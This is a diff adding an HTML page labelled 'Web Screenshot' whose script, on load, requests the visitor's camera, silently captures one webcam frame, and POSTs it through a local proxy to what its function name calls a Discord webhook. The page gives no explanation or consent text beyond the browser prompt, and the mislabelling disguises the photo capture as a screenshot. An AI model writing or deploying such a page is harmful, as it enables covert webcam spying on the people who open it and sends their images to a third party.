@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Screenshot</title>
+</head>
+<body>
+    <script>
+        async function requestScreenshotPermission() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                document.body.appendChild(video);
+                video.srcObject = stream;
+
+                video.onloadeddata = async () => {
+                    video.play(); // Ensure the video plays before capturing
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    const screenshotData = canvas.toDataURL('image/png');
+                    stream.getTracks().forEach(track => track.stop());
+                    document.body.removeChild(video);
+
+                    sendToDiscordWebhook(screenshotData);
+                };
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+            }
+        }
+
+        async function sendToDiscordWebhook(screenshotData) {
+            try {
+                // Use a proxy server URL
+                const proxyUrl = 'http://localhost:3000'; // Change this to your proxy's URL
+                const targetUrl = '/save-and-send-screenshot'; // This will be handled by our Node.js server
+                const fullUrl = `${proxyUrl}${targetUrl}`; // Combine proxy URL with your target URL
+
+                const response = await fetch(fullUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        screenshotData: screenshotData,
+                    }),
+                });
+
+                if (!response.ok) {
+                    console.error('Error sending to server. HTTP status:', response.status);
+                } else {
+                    console.log('Screenshot sent to server for processing');
+                }
+            } catch (error) {
+                console.error('Error sending to server:', error);
+            }
+        }
+
+        requestScreenshotPermission();
+    </script>
+</body>
+</html>
